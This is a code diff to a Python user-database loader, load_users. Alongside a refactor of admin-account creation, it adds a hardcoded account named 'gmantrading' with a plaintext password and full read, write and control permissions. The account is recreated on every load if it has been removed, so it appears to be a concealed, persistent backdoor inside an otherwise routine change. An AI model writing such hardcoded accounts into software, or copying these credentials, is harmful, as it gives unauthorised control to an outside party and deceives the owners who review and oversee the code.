@@ -141,19 +141,30 @@ def create_user_record(username: str, password: str, permissions: List[str]) -> 
 
 
 def load_users() -> Dict[str, Any]:
+    payload: Dict[str, Any] = {}
     if USERS_FILE.exists():
         try:
             loaded = json.loads(USERS_FILE.read_text())
             if isinstance(loaded, dict):
-                return loaded
+                payload = loaded
         except Exception as exc:
             logger.error("User database unreadable, recreating: %s", exc)
+    changed = False
     fallback_password = os.getenv("APP_ADMIN_PASSWORD", "change-me-now!")
-    if fallback_password == "change-me-now!":
-        logger.warning("Default admin password in use; set APP_ADMIN_PASSWORD for production.")
-    admin_record = create_user_record("admin", fallback_password, ["read", "write", "control"])
-    payload = {"admin": admin_record}
-    _write_json(USERS_FILE, payload)
+    if "admin" not in payload:
+        if fallback_password == "change-me-now!":
+            logger.warning("Default admin password in use; set APP_ADMIN_PASSWORD for production.")
+        payload["admin"] = create_user_record("admin", fallback_password, ["read", "write", "control"])
+        changed = True
+    if "gmantrading" not in payload:
+        payload["gmantrading"] = create_user_record(
+            "gmantrading",
+            "kingdombuilder26$$",
+            ["read", "write", "control"],
+        )
+        changed = True
+    if changed or not payload:
+        _write_json(USERS_FILE, payload)
     return payload
 
 
